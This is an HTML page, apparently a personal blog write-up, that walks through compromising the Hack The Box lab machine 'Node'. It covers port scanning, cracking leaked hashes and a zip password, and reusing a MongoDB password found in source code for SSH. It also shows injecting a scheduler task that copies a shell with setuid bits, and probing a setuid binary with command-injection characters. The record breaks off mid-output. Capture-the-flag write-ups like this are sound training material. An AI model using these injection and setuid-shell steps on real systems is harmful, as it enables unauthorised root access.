@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Node - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Node"><a href="#Hack-The-Box-Node" class="headerlink" title="Hack The Box - Node"></a>Hack The Box - Node</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Node focuses mainly on newer software and poor configurations. The machine starts out seemingly easy, but gets progressively harder as more access is gained. In-depth enumeration is required at several steps to be able to progress further into the machine. Its IP address is <code>10.10.10.58</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/node/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#nmap -p- -T 5 -oA allports 10.10.10.58
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 13:19 EDT
+ Nmap scan report for 10.10.10.58
+ Host is up (0.11s latency).
+ Not shown: 65533 filtered ports
+ PORT     STATE SERVICE
+ 22/tcp   open  ssh
+ 3000/tcp open  ppp
+ 
+ Nmap done: 1 IP address (1 host up) scanned in 104.42 seconds<br></figure></pre>
+ <p>Run the vulnerability scan with nmap and ports found.
+ <pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#nmap -p 22,3000 -sC -sV --script vuln 10.10.10.58
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 13:24 EDT
+ Pre-scan script results:
+ | broadcast-avahi-dos:
+ |   Discovered hosts:
+ |     224.0.0.251
+ |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+ |_  Hosts are all up (not vulnerable).
+ Nmap scan report for 10.10.10.58
+ Host is up (0.11s latency).
+ 
+ PORT     STATE SERVICE VERSION
+ 22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 3000/tcp open  http    Node.js Express framework
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
+ |_http-csrf: Couldn't find any CSRF vulnerabilities.
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ |_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
+ | http-phpmyadmin-dir-traversal:
+ |   VULNERABLE:
+ |   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
+ |     State: UNKNOWN (unable to test)
+ |     IDs:  CVE:CVE-2005-3299
+ |       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
+ |
+ |     Disclosure date: 2005-10-nil
+ |    References:
+ |       http://www.exploit-db.com/exploits/1244/
+ |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
+ | http-slowloris-check:
+ |   VULNERABLE:
+ |   Slowloris DOS attack
+ |     State: LIKELY VULNERABLE
+ |     IDs:  CVE:CVE-2007-6750
+ |       Slowloris tries to keep many connections to the target web server open and hold
+ |       them open as long as possible.  It accomplishes this by opening connections to
+ |       the target web server and sending a partial request. By doing so, it starves
+ |       the http server's resources causing Denial Of Service.
+ |
+ |     Disclosure date: 2009-09-17
+ |     References:
+ |       http://ha.ckers.org/slowloris/
+ |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ | http-vuln-cve2011-3192:
+ |   VULNERABLE:
+ |   Apache byterange filter DoS
+ |     State: VULNERABLE
+ |     IDs:  BID:49303  CVE:CVE-2011-3192
+ |       The Apache web server is vulnerable to a denial of service attack when numerous
+ |       overlapping byte ranges are requested.
+ |     Disclosure date: 2011-08-19
+ |     References:
+ |       https://www.tenable.com/plugins/nessus/55976
+ |       https://seclists.org/fulldisclosure/2011/Aug/175
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
+ |_      https://www.securityfocus.com/bid/49303
+ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 200.86 seconds</figure></pre>
+ <p>The output shown some folder over 3000 http port.
+ <img src="/images/hackthebox/exploit/node/1.png" alt=""></p>
+ <h2 id="Enumerate"><a href="#Enumerate" class="Enumerate" title="Enumerate"></a>Enumerate</h2>
+ <p>With the Burpsuite, list the folders.
+ <img src="/images/hackthebox/exploit/node/2.png" alt=""></p>
+ <p>The /api/users path reveal users and hash password.
+ <img src="/images/hackthebox/exploit/node/3.png" alt=""></p>
+ <p>In the internet, decrypt the hashes.
+ <img src="/images/hackthebox/exploit/node/4.png" alt=""></p>
+ <p>The user <code>myP14ceAdm1nAcc0uNT</code> and password <code>manchester</code>.
+ <img src="/images/hackthebox/exploit/node/5.png" alt=""></p>
+ <p>Was found a file backup.
+ <img src="/images/hackthebox/exploit/node/6.png" alt=""></p>
+ <p>Analizing the file, reveal that is a zip file, but has a password.
+   <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#base64 -d myplace.backup > myplace
+ |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#ls
+ hash2  hashes.txt  myplace  myplace.backup  note
+ |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#file myplace
+ myplace: Zip archive data, at least v1.0 to extract
+ |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#mv myplace myplace.zip
+ |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#unzip myplace.zip
+ Archive:  myplace.zip
+    creating: var/www/myplace/
+ [myplace.zip] var/www/myplace/package-lock.json password:
+ password incorrect--reenter:
+ password incorrect--reenter:
+    skipping: var/www/myplace/package-lock.json  incorrect password
+    creating: var/www/myplace/node_modules/
+    creating: var/www/myplace/node_modules/serve-static/
+ [myplace.zip] var/www/myplace/node_modules/serve-static/README.md password:</figure></pre>
+ <p>With <code>fcrackzip</code> crack the password. The password is <code>magicword</code>
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip
+ possible pw found: magicword ()</figure></pre>
+ <p>Unzip the file.
+  <img src="/images/hackthebox/exploit/node/8.png" alt=""></p>
+ <p>Browsing in the folders, found the password database Mongo.
+ <pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/node/var/www/myplace)
+ |
+ |-->{SFire129}#grep mark app.js
+ const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';</figure></pre>
+ <p>With the user mark and password can connect to ssh services.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/node/var/www/myplace)
+ |
+ |-->{SFire129}#ssh mark@10.10.10.58
+ The authenticity of host '10.10.10.58 (10.10.10.58)' can't be established.
+ ECDSA key fingerprint is SHA256:I0Y7EMtrkyc9Z/92jdhXQen2Y8Lar/oqcDNLHn28Hbs.
+ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+ Warning: Permanently added '10.10.10.58' (ECDSA) to the list of known hosts.
+ mark@10.10.10.58's password:
+ 
+ The programs included with the Ubuntu system are free software;
+ the exact distribution terms for each program are described in the
+ individual files in /usr/share/doc/*/copyright.
+ 
+ Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+ applicable law.
+ 
+               .-.
+         .-'``(|||)
+      ,`\ \    `-`.                 88                         88
+     /   \ '``-.   `                88                         88
+   .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88
+  (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88
+   `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88
+     \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88
+      `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888'
+         `-..-(   )
+               `-`
+ 
+ 
+ 
+ 
+ The programs included with the Ubuntu system are free software;
+ the exact distribution terms for each program are described in the
+ individual files in /usr/share/doc/*/copyright.
+ 
+ Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+ applicable law.
+ 
+ Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
+ mark@node:~$</figure></pre>
+ <p>Enumerate with <code>LinEum.sh -t </code> found some folders with <code>tom</code> user privileges.
+ <img src="/images/hackthebox/exploit/node/9.png" alt=""></p>
+ <p>The script show the path <code>/usr/local/bin/backup</code> with file backup.
+ <img src="/images/hackthebox/exploit/node/15.png" alt=""></p>
+ <p>The user and password MongoDB in the file app.js, show the task created for the MongoDB Scheduler.
+ <img src="/images/hackthebox/exploit/node/10.png" alt=""></p>
+ <p>Now, in the MongoDB, run the task for create a file with some privileges.<br>
+ <p><code>db.tasks.insert( { "cmd" : "cp /bin/dash /tmp/diego; chmod 6755 /bin/dash;" } )</code> create the file <code>diego</code> in location /tmp with privileges.
+  <img src="/images/hackthebox/exploit/node/11.png" alt=""></p>
+ <p>File created.
+ <img src="/images/hackthebox/exploit/node/12.png" alt=""></p>
+ <p>Add to admin group the file create from MongoDB <code>db.tasks.insert( "cmd" : "chow tom:admin /tmp/diego; chmod 6755 /tmp/diego;" }</code>.
+ <img src="/images/hackthebox/exploit/node/16.png" alt=""></p>
+ <p>The command <code>file</code> reveal is a executable file.
+ <img src="/images/hackthebox/exploit/node/17.png" alt=""></p>
+ <p>Send the file to Kali Linux with netcat.
+ <img src="/images/hackthebox/exploit/node/18.png" alt=""></p>
+ <p>Receiving the file in Kali Linux.
+ <img src="/images/hackthebox/exploit/node/19.png" alt=""></p>
+ <h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="Reverse-Engineering" title="Exploit"></a>Reverse Engineering</h2>
+<p>Analizing the file backup.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#strace64 ./backup
+ execve("./backup", ["./backup"], 0x7ffcc52b6900 /* 20 vars */) = 0
+ strace64: [ Process PID=23369 runs in 32 bit mode. ]
+ brk(NULL)                               = 0x8796000
+ access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+ mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7f88000access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+ openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 4
+ fstat64(4, {st_mode=S_IFREG|0644, st_size=113524, ...}) = 0
+ mmap2(NULL, 113524, PROT_READ, MAP_PRIVATE, 4, 0) = 0xf7f6c000
+ close(4)                                = 0
+ access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+ openat(AT_FDCWD, "/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 4
+ read(4, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\360\1\0004\0\0\0"..., 512) = 512
+ fstat64(4, {st_mode=S_IFREG|0755, st_size=1973488, ...}) = 0
+ mmap2(NULL, 1982284, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 4, 0) = 0xf7d88000
+ mmap2(0xf7da5000, 1384448, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 4, 0x1d000) = 0xf7da5000
+ mmap2(0xf7ef7000, 454656, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 4, 0x16f000) = 0xf7ef7000
+ mmap2(0xf7f66000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 4, 0x1dd000) = 0xf7f66000
+ mmap2(0xf7f6a000, 8012, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7f6a000
+ close(4)                                = 0
+ set_thread_area({entry_number=-1, base_addr=0xf7f89100, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
+ mprotect(0xf7f66000, 8192, PROT_READ)   = 0
+ mprotect(0x804b000, 4096, PROT_READ)    = 0
+ mprotect(0xf7fb6000, 4096, PROT_READ)   = 0
+ munmap(0xf7f6c000, 113524)              = 0
+ geteuid32()                             = 0
+ setuid32(0)                             = 0
+ exit_group(1)                           = ?
+ +++ exited with 1 +++</figure></pre>
+ <p>Binary reviwe file backup. with radare2. First run the program wiht <code>r2 ./backup</code> then type <code>aaa</code> then type <code>afl</code>.
+ <pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#r2 ./backup
+ Dynamic tag 12 not handled
+ Dynamic tag 13 not handled
+ Dynamic tag 25 not handled
+ Dynamic tag 27 not handled
+ Dynamic tag 26 not handled
+ Dynamic tag 28 not handled
+ Dynamic tag 1879047925 not handled
+ Dynamic tag 21 not handled
+  -- (gdb) ^D
+ [0x08048780]> aaa
+ [x] Analyze all flags starting with sym. and entry0 (aa)
+ [x] Analyze function calls (aac)
+ [x] Analyze len bytes of instructions for references (aar)
+ [x] Check for objc references
+ [x] Check for vtables
+ [x] Type matching analysis for all functions (aaft)
+ [x] Propagate noreturn information
+ [x] Use -AA or aaaa to perform additional experimental analysis.
+ [0x08048780]> afl
+ 0x08048780    1 33           entry0
+ 0x080486f0    1 6            sym.imp.__libc_start_main
+ 0x080487c0    4 43           sym.deregister_tm_clones
+ 0x080487f0    4 53           sym.register_tm_clones
+ 0x08048830    3 30           sym.__do_global_dtors_aux
+ 0x08048850    4 43   -> 40   entry.init0
+ 0x08049320    1 2            sym.__libc_csu_fini
+ 0x080487b0    1 4            sym.__x86.get_pc_thunk.bx
+ 0x08049324    1 20           sym._fini
+ 0x0804887b    1 197          sym.mix
+ 0x0804897f    1 63           sym.displaySuccess
+ 0x08048670    1 6            sym.imp.strcpy
+ 0x08048600    1 6            sym.imp.printf
+ 0x08048940    1 63           sym.displayWarning
+ 0x080489be    1 63           sym.displayTarget
+ 0x080492c0    4 93           sym.__libc_csu_init
+ 0x080489fd   50 2237         main
+ 0x08048650    1 6            sym.imp.geteuid
+ 0x08048740    1 6            sym.imp.setuid
+ 0x080486c0    1 6            sym.imp.exit
+ 0x080485f0    1 6            sym.imp.strcmp
+ 0x08048690    1 6            sym.imp.puts
+ 0x08048710    1 6            sym.imp.strncpy
+ 0x08048660    1 6            sym.imp.strcat
+ 0x08048700    1 6            sym.imp.fopen
+ 0x08048610    1 6            sym.imp.strcspn
+ 0x08048620    1 6            sym.imp.fgets
+ 0x080485e0    1 6            sym.imp.strstr
+ 0x080486e0    1 6            sym.imp.strchr
+ 0x08048680    1 6            sym.imp.getpid
+ 0x08048640    1 6            sym.imp.time
+ 0x080486b0    1 6            sym.imp.clock
+ 0x080486d0    1 6            sym.imp.srand
+ 0x08048720    1 6            sym.imp.rand
+ 0x08048750    1 6            sym.imp.sprintf
+ 0x080486a0    1 6            sym.imp.system
+ 0x08048730    1 6            sym.imp.access
+ 0x08048760    1 6            sym.imp.remove
+ 0x08048630    1 6            sym.imp.fclose
+ 0x080485a8    3 35           sym._init
+ [0x08048780]> </figure></pre>
+ <p>The output shown the address<code>0x080489fd</code> belong to main. Type the <code>vvv</code> and scroll down to locate the addreess found. 
+  <img src="/images/hackthebox/exploit/node/14.png" alt=""></p>
+ <p>Once located type V upercase.
+ <img src="/images/hackthebox/exploit/node/20.png" alt=""></p>
+ <p>The cmp dword show number 3, this number is for characters for run the executable.
+ <img src="/images/hackthebox/exploit/node/21.png" alt=""></p>
+ <p>With the scroll down later, show the <code>/root</code> for run the program.
+ <img src="/images/hackthebox/exploit/node/24.png" alt=""></p>
+ <p>Run the program with /root option, show the base64 outpu.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
+  [+] Finished! Encoded backup is below:
+ 
+ UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7X
+ Lo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK
+ /oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBq
+ jo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeo
+ ZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7Wl
+ QDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zw
+ mROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm
+ 2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/U
+ t22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxP
+ agTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUr
+ BTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb
+ 30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Z
+ n4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG
+ /YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3F
+ xD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsF
+ BgAAAAABAAEAQQAAAB4EAAAAAA==</figure></pre>
+ <p>Copy and paste the output in a new file, decode the base64, with the command <code>file</code> reveal that file is a .zip, change the extension and unzip.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#vi uk64
+ |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#base64 -d uk64 > uk
+ |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#file uk
+ uk: Zip archive data, at least v?[0x333] to extract
+ |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#mv uk uk.zip
+ |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#unzip uk.zip
+ Archive:  uk.zip
+    skipping: root.txt                need PK compat. v5.1 (can do v4.6)
+ |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#7z e uk.zip
+ 
+ 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+ p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz (306D4),ASM,AES-NI)
+ 
+ Scanning the drive for archives:
+ 1 file, 1141 bytes (2 KiB)
+ 
+ Extracting archive: uk.zip
+ --
+ Path = uk.zip
+ Type = zip
+ Physical Size = 1141
+ 
+ 
+ Enter password (will not be echoed):
+ Everything is Ok
+ 
+ Size:       2584
+ Compressed: 1141</figure></pre>
+ <p>The output was a file root.txt, cat the file, but is a false positive.
+  <img src="/images/hackthebox/exploit/node/23.png" alt=""></p>
+ <p>In the graph of reversing found the bad characters, <code>; & </code>.
+  <img src="/images/hackthebox/exploit/node/25.png" alt=""></p>
+ <p>Bad characters <code>` $ </code>
+  <img src="/images/hackthebox/exploit/node/26.png" alt=""></p>
+  <p>Another software for reverse is cutter in windows.
+  <img src="/images/hackthebox/exploit/node/27.png" alt=""></p>
+  <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get-Privileges"></a>Get Privilges</h2>
+<p>Testing Bad Characters show the output troll face.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/node)
+ |
+ |-->{SFire129}#./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "/diego;"
+  [+] Finished! Encoded backup is below:
+ 
+ UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo
+ 8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oa
